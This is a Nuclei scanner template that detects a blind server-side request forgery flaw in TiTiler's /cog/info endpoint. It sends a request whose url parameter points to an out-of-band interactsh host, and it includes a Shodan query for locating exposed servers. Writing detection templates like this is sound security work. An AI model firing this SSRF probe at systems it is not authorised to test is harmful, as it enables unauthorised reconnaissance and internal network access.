id: titiler-ssrf

info:
  name: TiTiler - Blind Server Side Request Forgery
  author: xbow,DhiyaneshDK
  severity: high
  description: |
    Blind SSRF vulnerability in TiTiler, a dynamic tile server for Cloud Optimized GeoTIFFs (COGs). The flaw lies in how the application handles the url parameter in the /cog/info endpoint, allowing attackers to make arbitrary internal or external HTTP requests.
  reference:
    - https://xbow.com/blog/xbow-titiler-lfi/
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"TiTiler"
  tags: titiler,oast,obb,ssrf

http:
  - raw:
      - |
        GET /cog/info?url=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 500'
          - 'contains(interactsh_protocol, "dns")'
          - 'contains(body, "<imageAttributes> in document")'
        condition: and
